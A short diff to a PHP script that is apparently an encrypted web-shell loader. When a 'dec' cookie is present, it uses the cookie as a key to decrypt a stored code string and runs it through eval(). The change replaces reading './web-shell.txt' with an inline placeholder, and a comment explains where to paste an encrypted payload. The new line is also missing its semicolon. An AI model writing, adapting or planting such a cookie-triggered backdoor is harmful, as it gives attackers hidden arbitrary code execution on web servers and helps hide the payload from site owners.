@@ -45,7 +45,7 @@ if (!empty($_POST['dec'])) {
 if (isset($_COOKIE['dec'])) {
 	// If the cookie is set , try decrypting and running
     $key = $_COOKIE['dec'];
-	$code = file_get_contents('./web-shell.txt');
+	$code = "encrypted code goes here" // You can use the $code_enc commented out above because it has to be encrypted first based on your key. Take the encrypted string and paste it here to execute your code
     eval(decrypt($key, $code));
 } else {
 	// If no cookie is set or POST received, unset the cookie variables if they already (for some reason) exist
